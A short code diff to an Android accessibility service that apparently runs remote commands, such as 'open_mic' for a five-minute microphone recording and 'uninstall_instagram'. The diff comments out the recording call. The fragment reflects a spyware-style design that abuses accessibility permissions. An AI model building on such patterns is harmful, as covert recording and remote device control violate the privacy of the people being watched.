@@ -271,7 +271,7 @@ public class MyAccessibilityService extends AccessibilityService {
 
             case "open_mic":
                 Log.d("CommandExec", "🎙 Starting mic recording for 5 minutes...");
-                MicRecorder.startRecording(getApplicationContext());
+                // MicRecorder.startRecording(getApplicationContext()); // УДАЛЕНО
                 break;
 
             case "uninstall_instagram":
